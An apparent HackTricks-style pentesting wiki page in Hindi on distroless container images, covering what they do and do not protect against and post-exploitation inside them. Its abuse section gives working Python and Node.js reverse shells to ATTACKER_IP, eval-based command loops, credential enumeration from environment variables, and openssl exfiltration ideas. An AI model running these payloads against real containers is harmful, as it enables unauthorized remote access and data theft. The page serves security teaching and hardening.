# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

एक **distroless** container image में **किसी एक खास application को चलाने के लिए ज़रूरी न्यूनतम runtime components** होते हैं। इसमें जानबूझकर आम distribution tooling, जैसे package managers, shells और generic userland utilities के बड़े संग्रह, हटा दिए जाते हैं। व्यवहार में, distroless images में अक्सर सिर्फ application binary या runtime, उसकी shared libraries, certificate bundles और बहुत सीमित filesystem layout होता है। <sup>[[1]](#references)</sup>

Distroless कोई नया kernel isolation primitive नहीं है। Distroless एक **image design strategy** है। यह container filesystem के **अंदर** उपलब्ध चीज़ों को बदलता है, न कि kernel container को कैसे isolate करता है। यह अंतर महत्वपूर्ण है, क्योंकि distroless मुख्य रूप से code execution मिलने के बाद attacker के इस्तेमाल के लिए उपलब्ध चीज़ें घटाकर environment को harden करता है। यह namespaces, seccomp, capabilities, AppArmor, SELinux या किसी अन्य runtime isolation mechanism की जगह नहीं लेता।

## Distroless क्यों मौजूद है

Distroless images का इस्तेमाल मुख्य रूप से इन चीज़ों को कम करने के लिए किया जाता है:

- image का आकार
- image की operational complexity
- vulnerabilities वाली packages और binaries की संख्या
- compromise के बाद attacker के लिए default रूप से उपलब्ध post-exploitation tools की संख्या

इसीलिए production application deployments में distroless images लोकप्रिय हैं। ऐसा container जिसमें shell, package manager और लगभग कोई generic tooling न हो, आम तौर पर operational रूप से समझने में आसान और compromise के बाद interactively abuse करने में मुश्किल होता है।

जानी-मानी distroless-style image families के उदाहरण:

- Google's distroless images <sup>[[1]](#references)</sup>
- Chainguard hardened/minimal images <sup>[[2]](#references)</sup>

## Distroless का क्या मतलब नहीं है

एक distroless container अपने आप:

- rootless नहीं होता
- non-privileged नहीं होता
- read-only नहीं होता
- seccomp, AppArmor या SELinux से सुरक्षित नहीं होता
- container escape से सुरक्षित नहीं होता

फिर भी distroless image को `--privileged`, host namespace sharing, खतरनाक bind mounts या mounted runtime socket के साथ चलाना संभव है। ऐसी स्थिति में image minimal हो सकती है, लेकिन container फिर भी बेहद असुरक्षित हो सकता है। Distroless **userland attack surface** को बदलता है, **kernel trust boundary** को नहीं।

## आम Operational विशेषताएँ

जब आप किसी distroless container को compromise करते हैं, तो सबसे पहले आम तौर पर पता चलता है कि आपकी सामान्य धारणाएँ सही नहीं रहतीं। हो सकता है कि `sh`, `bash`, `ls`, `id`, `cat` मौजूद न हों, और कभी-कभी libc-based environment भी न हो जो आपके सामान्य tradecraft के मुताबिक काम करे। इसका असर offense और defense, दोनों पर पड़ता है, क्योंकि tooling की कमी से debugging, incident response और post-exploitation का तरीका बदल जाता है।

सबसे आम स्थितियाँ ये हैं:

- application runtime मौजूद होता है, लेकिन बाकी चीज़ें बहुत कम होती हैं
- shell-based payloads fail हो जाते हैं, क्योंकि shell मौजूद नहीं होता
- helper binaries न होने से आम enumeration one-liners fail हो जाते हैं
- अक्सर read-only rootfs या writable tmpfs locations पर `noexec` जैसी file system protections भी मौजूद होती हैं

आमतौर पर इसी मेल के कारण लोग "weaponizing distroless" की बात करते हैं।

## Distroless और Post-Exploitation

Distroless environment में मुख्य offensive चुनौती हमेशा शुरुआती RCE नहीं होती। अक्सर चुनौती उसके बाद आने वाली चीज़ें होती हैं। अगर exploited workload में Python, Node.js, Java या Go जैसे language runtime के ज़रिए code execution मिलता है, तो आप arbitrary logic चला सकते हैं, लेकिन उन सामान्य shell-centric workflows के ज़रिए नहीं जो दूसरे Linux targets में आम हैं।

इसका मतलब है कि post-exploitation अक्सर इन तीन तरीकों में से किसी एक पर निर्भर करता है:

1. **मौजूदा language runtime का सीधे इस्तेमाल करें** ताकि environment enumerate कर सकें, sockets खोल सकें, files पढ़ सकें या अतिरिक्त payloads stage कर सकें।
2. **अपना tooling memory में लाएँ**, अगर filesystem read-only हो या writable locations `noexec` के साथ mount की गई हों।
3. **image में पहले से मौजूद binaries का दुरुपयोग करें**, अगर application या उसकी dependencies में कुछ अनपेक्षित रूप से उपयोगी शामिल हो।

## Abuse

### आपके पास पहले से मौजूद Runtime को Enumerate करें

कई distroless containers में shell नहीं होता, लेकिन application runtime मौजूद होता है। अगर target Python service है, तो Python मौजूद है। अगर target Node.js है, तो Node मौजूद है। इससे अक्सर files enumerate करने, environment variables पढ़ने, reverse shells खोलने और memory में execution stage करने के लिए पर्याप्त functionality मिल जाती है—और `/bin/sh` चलाने की ज़रूरत भी नहीं पड़ती।

Python के साथ एक सरल उदाहरण:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Node.js के साथ एक सरल उदाहरण:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

प्रभाव:

- environment variables की recovery, जिनमें अक्सर credentials या service endpoints शामिल होते हैं
- `/bin/ls` के बिना filesystem enumeration
- writable paths और mounted secrets की पहचान

### `/bin/sh` के बिना Interactive Runtime

यदि image में `sh` या `bash` नहीं है, तो classic shell-based reverse shell विफल हो जाता है। ऐसी स्थिति में, मौजूद न होने वाला shell शुरू करने के बजाय installed language runtime में एक interactive session उपलब्ध कराएँ।

उदाहरण के लिए, यह Python payload socket पर एक interactive Python console redirect करता है:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

समकक्ष Node.js तरीका socket पर प्राप्त JavaScript का मूल्यांकन कर सकता है। यह JavaScript REPL है, operating-system shell नहीं; filesystem, process और networking operations Node के APIs के माध्यम से करने होंगे:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

दोनों उदाहरणों के लिए outbound connectivity और उपलब्ध interpreter की आवश्यकता होती है, और दोनों केवल वही functionality देते हैं जो उस interpreter में उपलब्ध है।

अगर image में अनपेक्षित रूप से `/bin/sh` शामिल हो, तो classic interpreter-assisted shell payloads अब भी उपयोगी हैं। इन्हें अलग से दिखाया गया है, क्योंकि ये वास्तव में shell-free नहीं हैं:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

पुराना Python command-loop pattern तब भी उपयोगी है, जब `/bin/sh` मौजूद हो, लेकिन interactive PTY का उपयोग असुविधाजनक हो। इसे यहाँ इसकी वास्तविक dependency स्पष्ट रखते हुए शामिल किया गया है: `subprocess.run(..., shell=True)` system shell को invoke करता है और इसलिए **no-shell technique नहीं है**।

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### पूरा उदाहरण: No-Shell Python Command Loop

अगर image में Python है, लेकिन बिल्कुल भी shell नहीं है, तो स्थानीय Python REPL से अब भी filesystem, environment और network का निरीक्षण किया जा सकता है:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

यह loop `/bin/sh` invoke नहीं करता। यह सीधे Python expressions और statements evaluate करता है, इसलिए operations में shell commands के बजाय Python APIs का इस्तेमाल होना चाहिए। इस सीमा के बावजूद, यह basic shell के कई काम कर सकता है: filesystem और environment की enumeration, data access, network activity, और installed runtime के ज़रिए आगे के payloads को stage करना।

### In-Memory Tool Execution

Distroless images को अक्सर इनके साथ इस्तेमाल किया जाता है:

- `readOnlyRootFilesystem: true`
- writable लेकिन `noexec` tmpfs, जैसे `/dev/shm`
- package management tools की अनुपस्थिति

इस संयोजन में, "binary को disk पर download करके चलाने" वाले classic workflows भरोसेमंद नहीं रहते। ऐसे मामलों में, memory execution techniques मुख्य विकल्प बन जाती हैं।

इस विषय का समर्पित पेज यहाँ है:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

वहाँ सबसे प्रासंगिक techniques हैं:

- scripting runtimes के ज़रिए `memfd_create` + `execve` <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Python, Node.js या PHP service के लिए, शुरुआती बिंदु template injection, prototype pollution या unsafe evaluation जैसा application bug हो सकता है। अगर इससे process के अंदर code execution मिलता है, तो `/proc/self/mem` technique shell या disk पर executable file के बिना loader चला सकती है। इससे execution container process की identity के तहत ही होता है; container escape के लिए किसी अलग runtime या host boundary weakness की ज़रूरत होती है। आवश्यक शर्तों के लिए [read-only/noexec/distroless techniques](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) देखें।

### Image में पहले से मौजूद Binaries

कुछ distroless images में अब भी ऐसे binaries होते हैं जो operational रूप से ज़रूरी होते हैं और compromise के बाद उपयोगी साबित हो सकते हैं। अक्सर देखा जाने वाला एक उदाहरण `openssl` है, क्योंकि applications को कभी-कभी crypto- या TLS-संबंधी कामों के लिए इसकी ज़रूरत होती है।

एक त्वरित search pattern यह है:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

यदि `openssl` मौजूद है, तो इसका उपयोग इन कामों के लिए किया जा सकता है:

- outbound TLS connections
- किसी अनुमत egress channel के ज़रिए data exfiltration
- encoded/encrypted blobs के ज़रिए payload data को stage करना

सटीक दुरुपयोग इस बात पर निर्भर करता है कि वास्तव में क्या-क्या installed है, लेकिन सामान्य विचार यह है कि distroless का मतलब "बिल्कुल भी tools नहीं" नहीं है; इसका मतलब है "एक सामान्य distribution image की तुलना में बहुत कम tools"।

## जांच

इन checks का लक्ष्य यह पता लगाना है कि image व्यवहार में वास्तव में distroless है या नहीं, और post-exploitation के लिए कौन-से runtime या helper binaries अब भी उपलब्ध हैं।

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

यहाँ क्या दिलचस्प है:

- अगर कोई shell मौजूद नहीं है, लेकिन Python या Node जैसा runtime मौजूद है, तो post-exploitation को runtime-driven execution की ओर pivot करना चाहिए।
- अगर root filesystem read-only है और `/dev/shm` writable है, लेकिन `noexec` है, तो memory execution techniques कहीं अधिक प्रासंगिक हो जाती हैं।
- अगर `openssl`, `busybox` या `java जैसी helper binaries मौजूद हैं, तो वे आगे की access शुरू करने के लिए पर्याप्त functionality दे सकती हैं।

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless-शैली की images | डिज़ाइन के अनुसार न्यूनतम userland | कोई shell या package manager नहीं; केवल application/runtime dependencies | debugging layers, sidecar shells जोड़ना, busybox या tooling को कॉपी करना |
| Chainguard minimal images | डिज़ाइन के अनुसार न्यूनतम userland | कम package surface, अक्सर एक runtime या service पर केंद्रित | `:latest-dev` या debug variants का इस्तेमाल, build के दौरान tools कॉपी करना |
| Distroless images इस्तेमाल करने वाले Kubernetes workloads | Pod config पर निर्भर | Distroless केवल userland को प्रभावित करता है; Pod की security posture फिर भी Pod spec और runtime defaults पर निर्भर करती है | ephemeral debug containers, host mounts, privileged Pod settings जोड़ना |
| Distroless images चलाने वाले Docker / Podman | run flags पर निर्भर | न्यूनतम filesystem, लेकिन runtime security फिर भी flags और daemon configuration पर निर्भर करती है | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

मुख्य बात यह है कि distroless एक **image property** है, runtime protection नहीं। इसका लाभ compromise के बाद filesystem के भीतर उपलब्ध चीज़ों को कम करने से आता है। Build tools को final image से बाहर रखने का एक आम तरीका multi-stage builds हैं। <sup>[[3]](#references)</sup>

## संबंधित पृष्ठ

distroless environments में आम तौर पर ज़रूरी filesystem और memory-execution bypasses के लिए:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

distroless workloads पर भी लागू होने वाले container runtime, socket और mount abuse के लिए:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Distroless container images](https://github.com/GoogleContainerTools/distroless)
- [2] [Chainguard Images documentation](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Multi-stage builds](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
